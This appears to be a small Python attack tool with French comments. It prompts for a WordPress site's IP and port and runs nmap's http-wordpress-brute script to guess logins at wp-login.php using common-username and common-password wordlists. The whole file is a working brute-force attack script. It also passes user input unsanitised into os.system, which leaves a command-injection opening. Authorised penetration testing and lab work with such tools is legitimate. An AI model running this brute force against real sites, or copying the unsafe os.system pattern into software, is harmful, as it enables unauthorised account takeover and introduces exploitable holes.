import os

#demande l'ip de la machine à scanner
ip = input("Veuillez entrer l'adresse IP du Wordpress : ")
port = input ("Veuillez entrer le port du site cible Wordpress : ")

#execute la commande qui nous permet d'effectuer le brute avec des dictionnaires
os.system(f"nmap --script http-wordpress-brute --script-args 'userdb=/usr/share/wordlists/commonusernames.txt,passdb=/usr/share/wordlists/1000commonpasswords.txt,brute.firstonly=true,http-wordpress-brute.uri=/wordpress/wp-login.php' {ip} -p {port}")
